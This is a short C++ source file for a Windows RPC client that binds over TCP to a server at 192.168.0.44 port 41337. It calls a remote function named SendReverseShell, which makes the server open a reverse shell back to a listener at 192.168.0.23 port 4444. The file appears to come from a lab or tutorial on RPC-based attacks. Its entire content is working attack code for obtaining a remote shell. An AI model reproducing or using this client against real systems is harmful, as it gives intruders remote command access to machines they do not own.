#include <iostream>
#include "RemotePrivilegeCall.h"
#include <windows.h>
// Links the rpcrt4.lib which exposes the WinAPI RPC functions
#pragma comment(lib, "rpcrt4.lib")

int main()
{
   RPC_STATUS status;               // Used to store the RPC functions returns
   RPC_WSTR szStringBinding = NULL; // Stores the string binding

   // Creates the binding string
   status = RpcStringBindingCompose(
      NULL,                      // UUID of the interface (since there is only one interface we can use the NULL value)
      (RPC_WSTR)L"ncacn_ip_tcp", // TCP endpoint
      (RPC_WSTR)L"192.168.0.44", // IP address of the remote server
      (RPC_WSTR)L"41337",        // Port on which the interface is listening
      NULL,                      // Network protocole to use
      &szStringBinding);         // Used to store the binding string.

   // Binds to the interface using the string binding
   status = RpcBindingFromStringBinding(
      szStringBinding,      // Binding string to validate
      &ImplicitHandle);     // Stores the results in the binding handle

   RpcTryExcept
   {
      // Calls the remote SendReverseShell function
      SendReverseShell(
		reinterpret_cast<unsigned char*>("192.168.0.23"),
		4444
	  );
   }
   RpcExcept(1)
   {
      printf("Runtime error %d", RpcExceptionCode())
   }
   RpcEndExcept

   // Frees the memory allocated to the binding string
   status = RpcStringFree(&szStringBinding);

   // Disconnects from the binding
   status = RpcBindingFree(&ImplicitHandle); 
}

void* __RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

// Fonction permettant de désallouée la mémoire de l'interface RPC
void __RPC_USER midl_user_free(void* p)
{
    free(p);
}
